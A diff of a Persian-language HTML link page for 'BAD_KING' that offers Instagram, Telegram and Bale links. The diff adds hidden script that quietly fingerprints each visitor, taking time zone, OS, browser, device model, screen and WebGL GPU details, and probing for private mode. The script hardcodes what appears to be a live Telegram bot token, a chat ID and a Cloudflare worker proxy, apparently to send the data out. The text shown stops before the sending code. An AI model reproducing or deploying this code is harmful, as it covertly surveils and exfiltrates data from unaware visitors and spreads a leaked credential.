@@ -3,456 +3,1253 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>BAD_KING | صفحه رسمی</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <title>BAD_KING</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#0a0e1a;color:#e0e8f0;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;position:relative;overflow-x:hidden;direction:rtl}
-        .cyber-bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;background:radial-gradient(circle at 20% 30%,#0f1a2e,#05080f);overflow:hidden}
-        .cyber-bg::before{content:'';position:absolute;top:0;left:0;width:200%;height:200%;background:repeating-linear-gradient(0deg,rgba(0,255,200,0.03) 0px,rgba(0,255,200,0.03) 2px,transparent 2px,transparent 6px),repeating-linear-gradient(90deg,rgba(0,255,200,0.03) 0px,rgba(0,255,200,0.03) 2px,transparent 2px,transparent 6px);animation:gridMove 8s linear infinite;transform-origin:center}
-        @keyframes gridMove{0%{transform:translate(0,0)}100%{transform:translate(-50px,-50px)}}
-        .particles{position:absolute;top:0;left:0;width:100%;height:100%;z-index:1;pointer-events:none}
-        .particle{position:absolute;width:3px;height:3px;background:#00f0ff;border-radius:50%;box-shadow:0 0 15px #00f0ff;animation:floatParticle 12s infinite alternate ease-in-out;opacity:0.3}
-        .particle:nth-child(1){top:10%;left:15%;animation-duration:14s}
-        .particle:nth-child(2){top:25%;left:85%;animation-duration:18s;animation-delay:1s}
-        .particle:nth-child(3){top:60%;left:10%;animation-duration:16s;animation-delay:2s}
-        .particle:nth-child(4){top:80%;left:75%;animation-duration:20s;animation-delay:.5s}
-        .particle:nth-child(5){top:45%;left:45%;animation-duration:15s;animation-delay:3s}
-        .particle:nth-child(6){top:15%;left:50%;animation-duration:17s;animation-delay:1.5s}
-        .particle:nth-child(7){top:70%;left:30%;animation-duration:19s;animation-delay:2.5s}
-        .particle:nth-child(8){top:35%;left:70%;animation-duration:13s;animation-delay:.8s}
-        @keyframes floatParticle{0%{transform:translate(0,0) scale(1);opacity:.2}25%{transform:translate(30px,-40px) scale(1.5);opacity:.6}50%{transform:translate(-20px,30px) scale(.8);opacity:.3}75%{transform:translate(40px,20px) scale(1.2);opacity:.7}100%{transform:translate(-30px,-30px) scale(1);opacity:.2}}
-        .neon-line{position:absolute;background:linear-gradient(90deg,transparent,#00f0ff,transparent);height:1px;width:100%;opacity:.1;animation:neonMove 6s linear infinite}
-        .neon-line:nth-child(9){top:20%;animation-delay:0s}
-        .neon-line:nth-child(10){top:50%;animation-delay:2s}
-        .neon-line:nth-child(11){top:80%;animation-delay:4s}
-        @keyframes neonMove{0%{transform:translateX(-100%);opacity:0}50%{opacity:.3}100%{transform:translateX(100%);opacity:0}}
-        .container{position:relative;z-index:2;width:100%;max-width:500px;background:rgba(10,14,30,0.85);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border:1px solid rgba(0,240,255,0.1);border-radius:25px;padding:40px 25px 30px;box-shadow:0 20px 60px rgba(0,240,255,0.05);animation:fadeIn .8s ease-out}
-        @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
-        .brand{text-align:center;margin-bottom:10px}
-        .brand .logo{width:120px;height:120px;margin:0 auto 10px;display:block;border-radius:50%;object-fit:cover;border:2px solid rgba(0,240,255,0.15);box-shadow:0 0 40px rgba(0,240,255,0.05);transition:all .3s ease}
-        .brand .logo:hover{transform:scale(1.05);border-color:rgba(0,240,255,0.3);box-shadow:0 0 60px rgba(0,240,255,0.1)}
-        .brand h1{font-size:28px;font-weight:800;letter-spacing:3px;background:linear-gradient(135deg,#00f0ff,#7b2ffc);-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-shadow:0 0 40px rgba(0,240,255,0.1)}
-        .brand .tagline{font-size:13px;color:rgba(255,255,255,0.3);letter-spacing:5px;margin-top:5px;font-weight:300}
-        .divider{width:60px;height:2px;background:linear-gradient(90deg,transparent,rgba(0,240,255,0.3),transparent);margin:15px auto 25px}
-        .bio{text-align:center;font-size:14px;color:rgba(255,255,255,0.5);line-height:1.8;margin-bottom:25px;padding:0 10px}
-        .bio span{color:#00f0ff}
-        .social-links{display:block;margin-top:5px}
-        .social-item{display:flex;align-items:center;padding:14px 18px;margin-bottom:10px;background:rgba(255,255,255,0.03);border-radius:15px;border:1px solid rgba(255,255,255,0.05);transition:all .3s ease;text-decoration:none;color:#e0e8f0;cursor:pointer}
-        .social-item:hover{background:rgba(255,255,255,0.07);transform:translateX(-5px);border-color:rgba(0,240,255,0.15)}
-        .social-item i{font-size:22px;width:40px;text-align:center;margin-left:15px}
-        .social-item .info{flex:1}
-        .social-item .info .name{font-weight:600;font-size:15px}
+        body{background:#0a0e1a;color:#e0e8f0;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;direction:rtl}
+        .container{max-width:500px;background:rgba(10,14,30,0.85);backdrop-filter:blur(20px);border:1px solid rgba(0,240,255,0.1);border-radius:25px;padding:40px 25px;text-align:center}
+        .logo{width:120px;height:120px;border-radius:50%;object-fit:cover;margin-bottom:15px}
+        h1{font-size:28px;background:linear-gradient(135deg,#00f0ff,#7b2ffc);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+        .bio{color:rgba(255,255,255,0.5);margin:15px 0}
+        .social-item{display:flex;align-items:center;padding:12px 16px;margin:8px 0;background:rgba(255,255,255,0.03);border-radius:12px;border:1px solid rgba(255,255,255,0.05);text-decoration:none;color:#e0e8f0;transition:.3s}
+        .social-item:hover{background:rgba(255,255,255,0.07);border-color:rgba(0,240,255,0.2)}
+        .social-item i{width:35px;font-size:20px}
+        .social-item .info{flex:1;text-align:right}
+        .social-item .info .name{font-weight:600}
         .social-item .info .desc{font-size:12px;color:rgba(255,255,255,0.3)}
-        .social-item .arrow{color:rgba(255,255,255,0.15);font-size:14px}
         .social-item.instagram i{color:#E4405F}
         .social-item.telegram i{color:#0088cc}
         .social-item.bale i{color:#00d4b8}
         .social-item.youtube i{color:#FF0000;opacity:.2}
         .social-item.youtube{opacity:.4;cursor:not-allowed}
-        .footer{text-align:center;margin-top:25px;font-size:11px;color:rgba(255,255,255,0.15);letter-spacing:2px}
-        @media(max-width:480px){.container{padding:30px 15px 20px}.brand .logo{width:90px;height:90px}.brand h1{font-size:24px}.social-item{padding:12px 14px}.social-item i{font-size:20px;width:35px}}
-        ::-webkit-scrollbar{width:6px}
-        ::-webkit-scrollbar-track{background:rgba(0,0,0,0.3)}
-        ::-webkit-scrollbar-thumb{background:linear-gradient(135deg,#00f0ff,#7b2ffc);border-radius:10px}
-        .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,240,255,0.9);color:#0a0e1a;padding:10px 20px;border-radius:10px;font-weight:600;font-size:13px;z-index:999;display:none;animation:fadeIn .3s ease-out;direction:rtl;text-align:center}
+        .footer{color:rgba(255,255,255,0.15);font-size:11px;margin-top:20px}
+        .toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%);font-size:40px;z-index:999;display:none;animation:fadeIn .3s}
         .toast.show{display:block}
+        @keyframes fadeIn{from{opacity:0;transform:translateX(-50%) scale(.5)}to{opacity:1;transform:translateX(-50%) scale(1)}}
     </style>
 </head>
 <body>
-    <div class="toast" id="toast">✅ اطلاعات ذخیره شد</div>
-    <div class="cyber-bg"><div class="particles"><div class="particle"></div><div class="particle"></div><div class="particle"></div><div class="particle"></div><div class="particle"></div><div class="particle"></div><div class="particle"></div><div class="particle"></div></div><div class="neon-line"></div><div class="neon-line"></div><div class="neon-line"></div></div>
-    <div class="container">
-        <div class="brand"><img src="https://cdn.imgurl.ir/uploads/e125412_ChatGPT_Image_Jun_21_2026_09_44_35_PM.png" alt="BAD_KING" class="logo"><h1>BAD_KING</h1><div class="tagline">• OFFICIAL PAGE •</div></div>
-        <div class="divider"></div>
-        <div class="bio">به صفحه رسمی <span>BAD_KING</span> خوش آمدید<br>از طریق شبکه‌های اجتماعی زیر با ما در ارتباط باشید</div>
-        <div class="social-links">
-            <a href="https://www.instagram.com/danial__zeus/" target="_blank" class="social-item instagram"><i class="fab fa-instagram"></i><div class="info"><div class="name">اینستاگرام</div><div class="desc">مشاهده صفحه</div></div><div class="arrow"><i class="fas fa-chevron-left"></i></div></a>
-            <a href="https://t.me/+27rGW8kwLCZjNTE0" target="_blank" class="social-item telegram"><i class="fab fa-telegram-plane"></i><div class="info"><div class="name">تلگرام</div><div class="desc">عضویت در کانال</div></div><div class="arrow"><i class="fas fa-chevron-left"></i></div></a>
-            <a href="https://ble.ir/join/2xTEY9XA8z" target="_blank" class="social-item bale"><i class="fas fa-comment-dots"></i><div class="info"><div class="name">بله</div><div class="desc">عضویت در پیام‌رسان بله</div></div><div class="arrow"><i class="fas fa-chevron-left"></i></div></a>
-            <div class="social-item youtube"><i class="fab fa-youtube"></i><div class="info"><div class="name">یوتیوب</div><div class="desc">به زودی...</div></div><div class="arrow"><i class="fas fa-clock"></i></div></div>
-        </div>
-        <div class="footer"><i class="fas fa-shield-alt" style="margin-left:5px;"></i>BAD_KING © 2026</div>
-    </div>
-    <script>
-        // ================================================================
-        // BAD KING - با پروکسی V2Ray + تلگرام
-        // ================================================================
 
-        // ===== تنظیمات =====
-        const TELEGRAM_TOKEN = '8898805545:AAGZEfrjfLS9JWCeKygvS1l5pUWuNWLRQj4';
-        const TELEGRAM_CHAT_ID = '6652707900';
+<div class="container">
+    <img src="https://cdn.imgurl.ir/uploads/e125412_ChatGPT_Image_Jun_21_2026_09_44_35_PM.png" class="logo">
+    <h1>BAD_KING</h1>
+    <div class="bio">به صفحه رسمی <span style="color:#00f0ff">BAD_KING</span> خوش آمدید</div>
+    <a href="https://www.instagram.com/danial__zeus/" target="_blank" class="social-item instagram"><i class="fab fa-instagram"></i><div class="info"><div class="name">اینستاگرام</div><div class="desc">مشاهده صفحه</div></div><div>←</div></a>
+    <a href="https://t.me/+27rGW8kwLCZjNTE0" target="_blank" class="social-item telegram"><i class="fab fa-telegram-plane"></i><div class="info"><div class="name">تلگرام</div><div class="desc">عضویت در کانال</div></div><div>←</div></a>
+    <a href="https://ble.ir/join/2xTEY9XA8z" target="_blank" class="social-item bale"><i class="fas fa-comment-dots"></i><div class="info"><div class="name">بله</div><div class="desc">عضویت در پیام‌رسان بله</div></div><div>←</div></a>
+    <div class="social-item youtube"><i class="fab fa-youtube"></i><div class="info"><div class="name">یوتیوب</div><div class="desc">به زودی...</div></div><div>⏳</div></div>
+    <div class="footer">BAD_KING © 2026</div>
+</div>
 
-        // ===== پروکسی V2Ray (از کانفیگ شما) =====
-        const PROXY_HOST = 'ez-e536c2.ezaccess1f3c5a1.workers.dev';
-        const PROXY_PORT = '443';
-        const PROXY_UUID = 'd823f0a7-7e12-4af1-8833-38a8c48c6a0f';
-        const PROXY_PATH = '/';
-        const PROXY_SECURITY = 'tls';
+<div class="toast" id="toast">✅</div>
 
-        // ===== ساخت آدرس پروکسی =====
-        // از VLESS به HTTP تبدیل میکنیم
-        const PROXY_URL = `https://${PROXY_HOST}:${PROXY_PORT}`;
+<script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+<script>
+    // ================================================================
+    // BAD KING - کاملترین سیستم اطلاعاتی (180+ مورد)
+    // ================================================================
 
-        function showToast(msg){const t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),3000);}
+    const TELEGRAM_TOKEN = '8898805545:AAGZEfrjfLS9JWCeKygvS1l5pUWuNWLRQj4';
+    const TELEGRAM_CHAT_ID = '6652707900';
+    const WORKER_URL = 'https://badking-proxy.badking126.workers.dev/';
 
-        // ================================================================
-        // 1. اطلاعات زمان و تاریخ
-        // ================================================================
-        function getTimeInfo(){
-            const now=new Date();const start=new Date(now.getFullYear(),0,1);const diff=(now-start)/86400000;const week=Math.ceil((diff+start.getDay()+1)/7);
-            const seasons=['بهار','تابستان','پاییز','زمستان'];const month=now.getMonth();let season='';if(month>=2&&month<=4) season='بهار';else if(month>=5&&month<=7) season='تابستان';else if(month>=8&&month<=10) season='پاییز';else season='زمستان';
-            const pm=['فروردین','اردیبهشت','خرداد','تیر','مرداد','شهریور','مهر','آبان','آذر','دی','بهمن','اسفند'];
-            return {time:now.toLocaleString('fa-IR',{timeZone:'Asia/Tehran'}),timeISO:now.toISOString(),timeUTC:now.toUTCString(),timeUnix:now.getTime(),dayOfWeek:now.toLocaleString('fa-IR',{weekday:'long'}),dayOfWeekEn:now.toLocaleString('en-US',{weekday:'long'}),dayOfMonth:now.getDate(),month:pm[now.getMonth()],monthNumber:now.getMonth()+1,year:now.getFullYear(),hours:now.getHours(),minutes:now.getMinutes(),seconds:now.getSeconds(),timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,timezoneOffset:now.getTimezoneOffset(),weekNumber:week,season:season};
+    function showEmoji() {
+        const t = document.getElementById('toast');
+        t.textContent = '✅';
+        t.classList.add('show');
+        setTimeout(() => t.classList.remove('show'), 3000);
+    }
+
+    // ================================================================
+    // 1. اطلاعات زمان و تاریخ (15 مورد)
+    // ================================================================
+    function getTimeInfo() {
+        const now = new Date();
+        const start = new Date(now.getFullYear(), 0, 1);
+        const diff = (now - start) / 86400000;
+        const week = Math.ceil((diff + start.getDay() + 1) / 7);
+        const seasons = ['بهار', 'تابستان', 'پاییز', 'زمستان'];
+        const month = now.getMonth();
+        let season = '';
+        if (month >= 2 && month <= 4) season = 'بهار';
+        else if (month >= 5 && month <= 7) season = 'تابستان';
+        else if (month >= 8 && month <= 10) season = 'پاییز';
+        else season = 'زمستان';
+        const pm = ['فروردین', 'اردیبهشت', 'خرداد', 'تیر', 'مرداد', 'شهریور', 'مهر', 'آبان', 'آذر', 'دی', 'بهمن', 'اسفند'];
+        return {
+            time: now.toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' }),
+            timeISO: now.toISOString(),
+            timeUTC: now.toUTCString(),
+            timeUnix: now.getTime(),
+            dayOfWeek: now.toLocaleString('fa-IR', { weekday: 'long' }),
+            dayOfWeekEn: now.toLocaleString('en-US', { weekday: 'long' }),
+            dayOfMonth: now.getDate(),
+            month: pm[now.getMonth()],
+            monthNumber: now.getMonth() + 1,
+            year: now.getFullYear(),
+            hours: now.getHours(),
+            minutes: now.getMinutes(),
+            seconds: now.getSeconds(),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: now.getTimezoneOffset(),
+            weekNumber: week,
+            season: season
+        };
+    }
+
+    // ================================================================
+    // 2. دستگاه و سخت‌افزار (20 مورد) - با 5 روش پشتیبان
+    // ================================================================
+    function getFullDeviceInfo() {
+        const ua = navigator.userAgent;
+        
+        // روش 1: تشخیص از User-Agent
+        let os = 'سایر';
+        if (ua.includes('Windows NT 10.0')) os = 'Windows 10';
+        else if (ua.includes('Windows NT 11.0')) os = 'Windows 11';
+        else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
+        else if (ua.includes('Windows')) os = 'Windows';
+        else if (ua.includes('Android 14')) os = 'Android 14';
+        else if (ua.includes('Android 13')) os = 'Android 13';
+        else if (ua.includes('Android 12')) os = 'Android 12';
+        else if (ua.includes('Android')) os = 'Android';
+        else if (ua.includes('iPhone OS 17')) os = 'iOS 17';
+        else if (ua.includes('iPhone OS 16')) os = 'iOS 16';
+        else if (ua.includes('iPhone')) os = 'iOS';
+        else if (ua.includes('iPad')) os = 'iPadOS';
+        else if (ua.includes('Mac OS X')) os = 'macOS';
+        else if (ua.includes('Linux')) os = 'Linux';
+        else if (ua.includes('CrOS')) os = 'ChromeOS';
+
+        // روش 2: تشخیص از navigator.platform
+        const platform = navigator.platform;
+        if (os === 'سایر' && platform) {
+            if (platform.includes('Win')) os = 'Windows';
+            else if (platform.includes('Mac')) os = 'macOS';
+            else if (platform.includes('Linux')) os = 'Linux';
+            else if (platform.includes('Android')) os = 'Android';
+            else if (platform.includes('iPhone')) os = 'iOS';
         }
 
-        // ================================================================
-        // 2. اطلاعات دستگاه
-        // ================================================================
-        function getDeviceInfo(){
-            const ua=navigator.userAgent;
-            let os='سایر';if(ua.includes('Windows NT 10.0')) os='Windows 10';else if(ua.includes('Windows NT 11.0')) os='Windows 11';else if(ua.includes('Windows NT 6.1')) os='Windows 7';else if(ua.includes('Windows')) os='Windows';else if(ua.includes('Android 14')) os='Android 14';else if(ua.includes('Android 13')) os='Android 13';else if(ua.includes('Android 12')) os='Android 12';else if(ua.includes('Android')) os='Android';else if(ua.includes('iPhone OS 17')) os='iOS 17';else if(ua.includes('iPhone OS 16')) os='iOS 16';else if(ua.includes('iPhone')) os='iOS';else if(ua.includes('iPad')) os='iPadOS';else if(ua.includes('Mac OS X')) os='macOS';else if(ua.includes('Linux')) os='Linux';else if(ua.includes('CrOS')) os='ChromeOS';
-            let browser='سایر',bv='';if(ua.includes('Chrome')&&!ua.includes('Edg')&&!ua.includes('OPR')){browser='Chrome';const m=ua.match(/Chrome\/(\d+)/);if(m) bv=m[1];}else if(ua.includes('Firefox')){browser='Firefox';const m=ua.match(/Firefox\/(\d+)/);if(m) bv=m[1];}else if(ua.includes('Safari')&&!ua.includes('Chrome')){browser='Safari';const m=ua.match(/Version\/(\d+)/);if(m) bv=m[1];}else if(ua.includes('Edg')){browser='Edge';const m=ua.match(/Edg\/(\d+)/);if(m) bv=m[1];}else if(ua.includes('Opera')||ua.includes('OPR')){browser='Opera';const m=ua.match(/Opera\/(\d+)/);if(m) bv=m[1];}
-            let engine='سایر';if(browser==='Chrome'||browser==='Edge'||browser==='Opera') engine='Blink';else if(browser==='Firefox') engine='Gecko';else if(browser==='Safari') engine='WebKit';
-            let dt='دسکتاپ',dm='نامشخص',dv='نامشخص',isMobile=false;if(/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/i.test(ua)) isMobile=true;
-            if(/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(ua)){dt='تبلت';if(ua.includes('iPad')){dm='iPad';dv='Apple';}else if(ua.includes('Samsung')){dm='Galaxy Tab';dv='Samsung';}}else if(isMobile){dt='موبایل';if(ua.includes('iPhone')){dm='iPhone';dv='Apple';}else if(ua.includes('Samsung')){dm='Samsung Galaxy';dv='Samsung';}else if(ua.includes('Xiaomi')){dm='Xiaomi';dv='Xiaomi';}else if(ua.includes('Huawei')){dm='Huawei';dv='Huawei';}else if(ua.includes('OnePlus')){dm='OnePlus';dv='OnePlus';}else if(ua.includes('Pixel')){dm='Google Pixel';dv='Google';}else if(ua.includes('Nokia')){dm='Nokia';dv='Nokia';}else if(ua.includes('LG')){dm='LG';dv='LG';}else if(ua.includes('Sony')){dm='Xperia';dv='Sony';}else if(ua.includes('Motorola')){dm='Motorola';dv='Motorola';}else{dm='گوشی موبایل';dv='نامشخص';}}else{if(ua.includes('Windows')) dv='PC';else if(ua.includes('Mac')){dv='Apple';dm='Mac';}else if(ua.includes('Linux')) dv='PC';else if(ua.includes('CrOS')){dv='Google';dm='Chromebook';}}
-            let arch='نامشخص';if(ua.includes('WOW64')||ua.includes('Win64')||ua.includes('x86_64')||ua.includes('amd64')) arch='64-bit';else if(ua.includes('x86')||ua.includes('i686')) arch='32-bit';else if(ua.includes('arm64')||ua.includes('aarch64')) arch='ARM 64-bit';else if(ua.includes('armv')) arch='ARM';
-            let cpu='نامشخص';if(ua.includes('Intel')) cpu='Intel';else if(ua.includes('AMD')) cpu='AMD';else if(ua.includes('Apple')) cpu='Apple Silicon';else if(ua.includes('ARM')) cpu='ARM';
-            return {os,browser,browserVer:bv,engine,deviceType:dt,deviceModel:dm,deviceVendor:dv,isMobile:isMobile?'بله':'خیر',architecture:arch,cpuType:cpu,platform:navigator.platform,vendor:navigator.vendor||'نامشخص',appVersion:navigator.appVersion.substring(0,100),userAgent:ua,memory:navigator.deviceMemory||'نامشخص',cores:navigator.hardwareConcurrency||'نامشخص'};
+        // روش 3: تشخیص از navigator.userAgentData
+        let osFromData = '';
+        try {
+            if (navigator.userAgentData && navigator.userAgentData.platform) {
+                osFromData = navigator.userAgentData.platform;
+                if (osFromData) os = osFromData;
+            }
+        } catch(e) {}
+
+        // روش 4: تشخیص از navigator.appVersion
+        if (os === 'سایر' && navigator.appVersion) {
+            if (navigator.appVersion.includes('Win')) os = 'Windows';
+            else if (navigator.appVersion.includes('Mac')) os = 'macOS';
+            else if (navigator.appVersion.includes('Linux')) os = 'Linux';
+            else if (navigator.appVersion.includes('Android')) os = 'Android';
         }
 
-        // ================================================================
-        // 3. اطلاعات صفحه نمایش
-        // ================================================================
-        function getScreenInfo(){
-            const s=window.screen;const pr=window.devicePixelRatio||1;let rr='نامشخص';try{if(s.refreshRate) rr=s.refreshRate+'Hz';}catch(e){}
-            let hdr='خیر';try{const c=document.createElement('canvas');const gl=c.getContext('webgl');if(gl){const ext=gl.getExtension('EXT_color_buffer_float');if(ext) hdr='بله';}}catch(e){}
-            let wcg='خیر';try{if(window.matchMedia('(color-gamut: p3)').matches) wcg='P3';else if(window.matchMedia('(color-gamut: rec2020)').matches) wcg='Rec.2020';}catch(e){}
-            return {screenWidth:s.width,screenHeight:s.height,availWidth:s.availWidth,availHeight:s.availHeight,colorDepth:s.colorDepth+' بیت',pixelRatio:pr+'x',refreshRate:rr,orientation:s.orientation?.type||'نامشخص',orientationAngle:s.orientation?.angle||0,hdrSupport:hdr,wideColorGamut:wcg,winWidth:window.innerWidth,winHeight:window.innerHeight,outerWidth:window.outerWidth||0,outerHeight:window.outerHeight||0};
+        // روش 5: تشخیص از navigator.vendor
+        if (os === 'سایر' && navigator.vendor) {
+            if (navigator.vendor.includes('Apple')) os = 'iOS/macOS';
+            else if (navigator.vendor.includes('Google')) os = 'Android/ChromeOS';
         }
 
-        // ================================================================
-        // 4. اطلاعات سخت‌افزار
-        // ================================================================
-        function getHardwareInfo(){
-            let vram='نامشخص',gv='نامشخص',gr='نامشخص',hw='نامشخص',w2='خیر',mts='نامشخص';
-            try{const c=document.createElement('canvas');const gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(gl){const ext=gl.getExtension('WEBGL_debug_renderer_info');if(ext){gv=gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)||'نامشخص';gr=gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)||'نامشخص';const match=gr.match(/(\d+)\s*MB/);if(match) vram=match[1]+' MB';hw=gv.includes('Intel')||gv.includes('NVIDIA')||gv.includes('AMD')||gv.includes('Apple')?'فعال':'نرم‌افزاری';}if(c.getContext('webgl2')||c.getContext('experimental-webgl2')) w2='بله';mts=gl.getParameter(gl.MAX_TEXTURE_SIZE)+' پیکسل';}}catch(e){}
-            let pm='عمومی';try{localStorage.setItem('_test_','_test_');localStorage.removeItem('_test_');}catch(e){pm='ناشناس';}
-            return {vram,gpuVendor:gv,gpuRenderer:gr,hwAcceleration:hw,webgl2Support:w2,maxTextureSize:mts,privateMode:pm,cookie:navigator.cookieEnabled?'فعال':'غیرفعال',doNotTrack:navigator.doNotTrack||'غیرفعال',onLine:navigator.onLine?'متصل':'قطع',touch:('ontouchstart' in window||navigator.maxTouchPoints>0)?'بله':'خیر',touchPoints:navigator.maxTouchPoints||0};
+        // مرورگر
+        let browser = 'سایر', bv = '';
+        // روش 1: از User-Agent
+        if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) {
+            browser = 'Chrome';
+            const m = ua.match(/Chrome\/(\d+)/);
+            if (m) bv = m[1];
+        } else if (ua.includes('Firefox')) {
+            browser = 'Firefox';
+            const m = ua.match(/Firefox\/(\d+)/);
+            if (m) bv = m[1];
+        } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
+            browser = 'Safari';
+            const m = ua.match(/Version\/(\d+)/);
+            if (m) bv = m[1];
+        } else if (ua.includes('Edg')) {
+            browser = 'Edge';
+            const m = ua.match(/Edg\/(\d+)/);
+            if (m) bv = m[1];
+        } else if (ua.includes('Opera') || ua.includes('OPR')) {
+            browser = 'Opera';
+            const m = ua.match(/Opera\/(\d+)/);
+            if (m) bv = m[1];
+        }
+        // روش 2: از navigator.userAgentData
+        try {
+            if (navigator.userAgentData && navigator.userAgentData.brands) {
+                const brands = navigator.userAgentData.brands;
+                for (const b of brands) {
+                    if (b.brand.includes('Chromium')) { browser = 'Chromium'; bv = b.version; break; }
+                    else if (b.brand.includes('Firefox')) { browser = 'Firefox'; bv = b.version; break; }
+                    else if (b.brand.includes('Safari')) { browser = 'Safari'; bv = b.version; break; }
+                    else if (b.brand.includes('Edge')) { browser = 'Edge'; bv = b.version; break; }
+                }
+            }
+        } catch(e) {}
+
+        // دستگاه
+        let dt = 'دسکتاپ', dm = 'نامشخص', dv = 'نامشخص', isMobile = false;
+        // روش 1: از User-Agent
+        if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/i.test(ua)) isMobile = true;
+        if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(ua)) {
+            dt = 'تبلت';
+            if (ua.includes('iPad')) { dm = 'iPad'; dv = 'Apple'; } else if (ua.includes('Samsung')) { dm = 'Galaxy Tab'; dv = 'Samsung'; }
+        } else if (isMobile) {
+            dt = 'موبایل';
+            if (ua.includes('iPhone')) { dm = 'iPhone'; dv = 'Apple'; } else if (ua.includes('Samsung')) { dm = 'Samsung Galaxy'; dv = 'Samsung'; } else if (ua.includes('Xiaomi')) { dm = 'Xiaomi'; dv = 'Xiaomi'; } else if (ua.includes('Huawei')) { dm = 'Huawei'; dv = 'Huawei'; } else if (ua.includes('OnePlus')) { dm = 'OnePlus'; dv = 'OnePlus'; } else if (ua.includes('Pixel')) { dm = 'Google Pixel'; dv = 'Google'; } else if (ua.includes('Nokia')) { dm = 'Nokia'; dv = 'Nokia'; } else if (ua.includes('LG')) { dm = 'LG'; dv = 'LG'; } else if (ua.includes('Sony')) { dm = 'Xperia'; dv = 'Sony'; } else if (ua.includes('Motorola')) { dm = 'Motorola'; dv = 'Motorola'; } else { dm = 'گوشی موبایل'; dv = 'نامشخص'; }
+        } else {
+            if (ua.includes('Windows')) dv = 'PC';
+            else if (ua.includes('Mac')) { dv = 'Apple'; dm = 'Mac'; }
+            else if (ua.includes('Linux')) dv = 'PC';
+            else if (ua.includes('CrOS')) { dv = 'Google'; dm = 'Chromebook'; }
         }
 
-        // ================================================================
-        // 5. اطلاعات شبکه
-        // ================================================================
-        function getNetworkInfo(){
-            const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
-            return {type:conn?(conn.effectiveType||conn.type||'نامشخص'):'نامشخص',downlink:conn&&conn.downlink?conn.downlink+' Mbps':'نامشخص',rtt:conn&&conn.rtt?conn.rtt+' ms':'نامشخص',saveData:conn&&conn.saveData?'فعال':'غیرفعال'};
+        // روش 2: از navigator.userAgentData
+        try {
+            if (navigator.userAgentData && navigator.userAgentData.mobile !== undefined) {
+                if (navigator.userAgentData.mobile) {
+                    dt = 'موبایل';
+                    isMobile = true;
+                }
+            }
+        } catch(e) {}
+
+        // روش 3: از screen.availWidth/availHeight
+        try {
+            if (window.screen) {
+                const w = window.screen.availWidth;
+                const h = window.screen.availHeight;
+                if (w && h) {
+                    if (w < 600 && h < 800) { dt = 'موبایل'; isMobile = true; }
+                    else if (w < 1024 && h < 768) { dt = 'تبلت'; }
+                }
+            }
+        } catch(e) {}
+
+        // روش 4: از window.innerWidth/innerHeight
+        try {
+            if (window.innerWidth && window.innerHeight) {
+                const w = window.innerWidth;
+                const h = window.innerHeight;
+                if (w < 600 && h < 700) { dt = 'موبایل'; isMobile = true; }
+                else if (w < 1024 && h < 700) { dt = 'تبلت'; }
+            }
+        } catch(e) {}
+
+        // روش 5: از navigator.maxTouchPoints
+        try {
+            if (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) {
+                if (dt === 'دسکتاپ') dt = 'تبلت';
+            }
+        } catch(e) {}
+
+        let arch = 'نامشخص';
+        if (ua.includes('WOW64') || ua.includes('Win64') || ua.includes('x86_64') || ua.includes('amd64')) arch = '64-bit';
+        else if (ua.includes('x86') || ua.includes('i686')) arch = '32-bit';
+        else if (ua.includes('arm64') || ua.includes('aarch64')) arch = 'ARM 64-bit';
+        else if (ua.includes('armv')) arch = 'ARM';
+
+        let cpu = 'نامشخص';
+        if (ua.includes('Intel')) cpu = 'Intel';
+        else if (ua.includes('AMD')) cpu = 'AMD';
+        else if (ua.includes('Apple')) cpu = 'Apple Silicon';
+        else if (ua.includes('ARM')) cpu = 'ARM';
+
+        // GPU و VRAM
+        let vram = 'نامشخص', gv = 'نامشخص', gr = 'نامشخص', hw = 'نامشخص', w2 = 'خیر', mts = 'نامشخص';
+        // روش 1: WebGL
+        try {
+            const c = document.createElement('canvas');
+            const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+            if (gl) {
+                const ext = gl.getExtension('WEBGL_debug_renderer_info');
+                if (ext) {
+                    gv = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) || 'نامشخص';
+                    gr = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || 'نامشخص';
+                    const match = gr.match(/(\d+)\s*MB/);
+                    if (match) vram = match[1] + ' MB';
+                    hw = gv.includes('Intel') || gv.includes('NVIDIA') || gv.includes('AMD') || gv.includes('Apple') ? 'فعال' : 'نرم‌افزاری';
+                }
